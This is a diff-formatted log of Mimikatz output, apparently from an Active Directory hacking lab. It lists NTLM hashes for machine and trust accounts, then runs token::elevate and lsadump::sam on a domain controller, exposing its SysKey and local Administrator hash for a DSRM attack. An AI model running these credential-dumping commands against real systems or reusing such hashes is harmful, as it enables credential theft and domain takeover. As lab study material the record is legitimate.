+RID  : 00000865 (2149)
+User : DCORP-STDADM$
+LM   : 
+NTLM : ed3005093d910e9413a7f0293df473d3
+
+RID  : 0000b05d (45149)
+User : DCORP-STD347$
+LM   : 
+NTLM : 5589d3c9ccb8679949971975c9339b69
+
+RID  : 0000b05e (45150)
+User : DCORP-STD358$
+LM   : 
+NTLM : 058437842daa8ce47807097eb075d9f1
+
+RID  : 0000b05f (45151)
+User : DCORP-STD357$
+LM   : 
+NTLM : e8d93910216f7c9f1f16ad82e2d77abb
+
+RID  : 0000b060 (45152)
+User : DCORP-STD356$
+LM   : 
+NTLM : 59591431add4ce7451d6a686f8b2fb8c
+
+RID  : 0000b061 (45153)
+User : DCORP-STD355$
+LM   : 
+NTLM : 20fb4dc911ec1af73667d8f1e685ea40
+
+RID  : 0000b062 (45154)
+User : DCORP-STD354$
+LM   : 
+NTLM : 6fa62658615d96f86aa71d1ea7ab34c4
+
+RID  : 0000b063 (45155)
+User : DCORP-STD353$
+LM   : 
+NTLM : 112a5cf297164dbe87c5d75b85f2f1f7
+
+RID  : 0000b064 (45156)
+User : DCORP-STD352$
+LM   : 
+NTLM : 8e492b09e1359c88c23aa49476304e5f
+
+RID  : 0000b065 (45157)
+User : DCORP-STD351$
+LM   : 
+NTLM : 26490dbf02eeb962cc154c58444241fe
+
+RID  : 0000b066 (45158)
+User : DCORP-STD350$
+LM   : 
+NTLM : c1f561c357f780dd1b99e9e1e3e4b77b
+
+RID  : 0000b067 (45159)
+User : DCORP-STD349$
+LM   : 
+NTLM : b4993d48070d9edcebd585fd0b662709
+
+RID  : 0000b068 (45160)
+User : DCORP-STD348$
+LM   : 
+NTLM : 80d4d5b08ce0dd344d452088c1182589
+
+RID  : 0000044f (1103)
+User : mcorp$
+LM   : 
+NTLM : 455ef4ca2d65642d7a7063d4fa1468ca
+
+RID  : 00000450 (1104)
+User : us$
+LM   : 
+NTLM : 2c7c96280e73323f08d829b242196f37
+
+RID  : 000004bd (1213)
+User : ecorp$
+LM   : 
+NTLM : 19b730e983a105d59b62f365a0776817
+
+
+
+DSRM
+
+  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz(powershell) # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+532     {0;000003e7} 1 D 17932          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;006333a7} 0 D 6502060     dcorp\svcadmin  S-1-5-21-1874506631-3219952063-538504511-1122   (12g,26p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 6688094     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(powershell) # lsadump::sam
+Domain : DCORP-DC
+SysKey : 85462b93fc25ee67bb07ad899096199b
+Local SID : S-1-5-21-1752050383-1088309824-3131404450
+
+SAMKey : 33e0913ef3886d77d5873060bcea1cfb
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+
